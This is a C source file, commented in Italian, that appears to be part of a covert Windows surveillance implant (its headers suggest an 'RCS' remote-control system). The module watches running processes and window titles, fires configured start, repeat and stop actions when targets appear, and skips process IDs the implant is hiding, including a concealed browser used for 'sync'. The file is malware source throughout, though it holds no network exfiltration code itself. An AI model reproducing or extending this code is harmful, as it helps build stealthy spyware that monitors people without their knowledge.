#include <Windows.h>
#include <cJSON/cJSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"
#include <rcs/strings.h>

#define EM_MP_SLEEPTIME 1000

HANDLE em_mp_monproc_thread = 0;
DWORD em_mp_monitor_count = 0;
monitored_proc* em_mp_process_table = NULL;

BOOL em_mp_cp = FALSE;


BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	enum_win_par_struct* enum_win_par;
	enum_win_par = (enum_win_par_struct*)lParam;
	WCHAR window_name[256];

	if (!HM_SafeGetWindowTextW(hwnd, window_name, (sizeof(window_name) / sizeof(WCHAR)) - 1))
		return TRUE;

	// NULL Termina (nel caso di troncature)
	window_name[(sizeof(window_name) / sizeof(WCHAR)) - 1] = 0;
	if (CmpWildW(em_mp_process_table[enum_win_par->index].proc_name, window_name))
	{
		enum_win_par->found = TRUE;
		return FALSE;
	}
	// Continua la ricerca
	return TRUE;
}

BOOL CmpFrontWindowName(WCHAR* str)
{
	HWND front_wind;
	WCHAR window_name[256];
	front_wind = GetForegroundWindow();
	if (!front_wind)
		return FALSE;

	if (!HM_SafeGetWindowTextW(front_wind, window_name, (sizeof(window_name) / sizeof(WCHAR)) - 1))
		return FALSE;

	window_name[(sizeof(window_name) / sizeof(WCHAR)) - 1] = 0;
	if (CmpWildW(str, window_name))
		return TRUE;

	return FALSE;
}

BOOL CmpFrontProcName(WCHAR* str)
{
	WCHAR* proc_name = NULL;
	HWND front_wind;
	DWORD proc_id = 0;

	front_wind = GetForegroundWindow();
	if (!front_wind)
		return FALSE;

	GetWindowThreadProcessId(front_wind, &proc_id);
	if (!proc_id)
		return FALSE;

	proc_name = HM_FindProcW(proc_id);
	if (!proc_name)
		return FALSE;

	if (CmpWildW(str, proc_name)) {
		SAFE_FREE(proc_name);
		return TRUE;
	}

	SAFE_FREE(proc_name);
	return FALSE;
}

DWORD MonitorProcesses(DWORD dummy)
{
	HANDLE proc_snap;
	PROCESSENTRY32W lppe;
	DWORD index;
	BOOL process_found;
	enum_win_par_struct enum_win_par;
	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;

	LOOP{
		CANCELLATION_POINT(em_mp_cp);

	// Cicla per tutti quelli dove stiamo cercando una finestra
	for (index = 0; index < em_mp_monitor_count; index++) {
		// Solo se cerchiamo il nome della finestra
		if (!em_mp_process_table[index].isWindow)
			continue;
		enum_win_par.index = index;
		enum_win_par.found = FALSE;

		if (!em_mp_process_table[index].isForeground)
		{
			// La funzione di call-back setta enum_win_par.found
			FNC(EnumWindows)(EnumWindowsProc, (LPARAM)&enum_win_par);
		}
		else
		{
			// Se invece deve compararla solo con la finestra in foreground...
			enum_win_par.found = CmpFrontWindowName(em_mp_process_table[index].proc_name);
		}

		if (enum_win_par.found && !em_mp_process_table[index].present) {
			em_mp_process_table[index].present = TRUE;
			TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
			CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
		}

		if (!enum_win_par.found && em_mp_process_table[index].present) {
			em_mp_process_table[index].present = FALSE;
			StopRepeatThread(em_mp_process_table[index].event_id);
			TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
		}
	}

	// Cicla per tutti quelli dove stiamo cercando il nome del processo
	proc_snap = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL);
	if (proc_snap == INVALID_HANDLE_VALUE) {
		Sleep(EM_MP_SLEEPTIME);
		continue;
	}
	// Cicla i processi nella process_table
	for (index = 0; index < em_mp_monitor_count; index++) {
		// Solo se stiamo cercando il nome del processo
		if (em_mp_process_table[index].isWindow)
			continue;

		// Se devo considerare solo il processo in foreground
		if (em_mp_process_table[index].isForeground) {
			process_found = CmpFrontProcName(em_mp_process_table[index].proc_name);

			if (process_found && !em_mp_process_table[index].present) {
				em_mp_process_table[index].present = TRUE;
				TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
				CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
			}

			if (!process_found && em_mp_process_table[index].present) {
				em_mp_process_table[index].present = FALSE;
				StopRepeatThread(em_mp_process_table[index].event_id);
				TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
			}
			continue;
		}

		// Se devo considerare tutti i processi...
		lppe.dwSize = sizeof(PROCESSENTRY32W);
		if (FNC(Process32FirstW)(proc_snap,  &lppe)) {
			process_found = FALSE;
			// Cicla tutti i processi attivi...
			do {
				// Non considera i processi che stiamo nascondendo.
				// C'e' una VAGHISSIMA possibilita' di race condition
				// con l'iexporer lanciato per la sync, ma al massimo fa compiere
				// una action di sync in piu'....
				SET_PID_HIDE_STRUCT(pid_hide, lppe.th32ProcessID);
				if (AM_IsHidden(HIDE_PID, &pid_hide))
					continue;

				// ...e li compara con quelli nella tabella
				if (CmpWildW(em_mp_process_table[index].proc_name, lppe.szExeFile)) {
					// Se il processo e' presente e non era ancora stato rilevato, lancia il primo evento
					if (!em_mp_process_table[index].present) {
						em_mp_process_table[index].present = TRUE;
						TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
						CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
					}
					process_found = TRUE;
					break;
				}
			} while (FNC(Process32NextW)(proc_snap,  &lppe));

			// Se il processo era stato rilevato come presente, ma adesso non lo e' piu'
			// lancia il secondo evento
			if (em_mp_process_table[index].present && !process_found) {
				em_mp_process_table[index].present = FALSE;
				StopRepeatThread(em_mp_process_table[index].event_id);
				TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
			}
		}
	}
	CloseHandle(proc_snap);
	Sleep(EM_MP_SLEEPTIME);
	}

		// not reached
	return 0;
}


void WINAPI EM_MonProcAdd(cJSON *conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	void* temp_table;

	// XXX...altro piccolo ed improbabile int overflow....
	if (!(temp_table = realloc(em_mp_process_table, (em_mp_monitor_count + 1) * sizeof(monitored_proc))))
		return;

	em_mp_process_table = (monitored_proc*)temp_table;
	memcpy(&em_mp_process_table[em_mp_monitor_count].event_param, event_param, sizeof(EVENT_PARAM));
	em_mp_process_table[em_mp_monitor_count].event_id = event_id;
	em_mp_process_table[em_mp_monitor_count].proc_name = cJSON_GetWideStringValue(cJSON_GetObjectItem(conf_json, "process"));
	em_mp_process_table[em_mp_monitor_count].isWindow = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "window"));
	em_mp_process_table[em_mp_monitor_count].isForeground = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "focus"));
	em_mp_process_table[em_mp_monitor_count].present = FALSE;

	em_mp_monitor_count++;
}


void WINAPI EM_MonProcStart()
{
	DWORD dummy;
	// Crea il thread solo se ci sono processi da monitorare
	if (em_mp_monitor_count > 0)
		em_mp_monproc_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorProcesses, NULL, 0, &dummy);
}


void WINAPI EM_MonProcStop()
{
	QUERY_CANCELLATION(em_mp_monproc_thread, em_mp_cp);

	// Cancella tutti i thread di repeat
	for (DWORD i = 0; i < em_mp_monitor_count; i++)
		StopRepeatThread(em_mp_process_table[i].event_id);

	// Libera tutte le strutture allocate
	for (DWORD i = 0; i < em_mp_monitor_count; i++)
		SAFE_FREE(em_mp_process_table[i].proc_name);
	SAFE_FREE(em_mp_process_table);
	em_mp_monitor_count = 0;
}
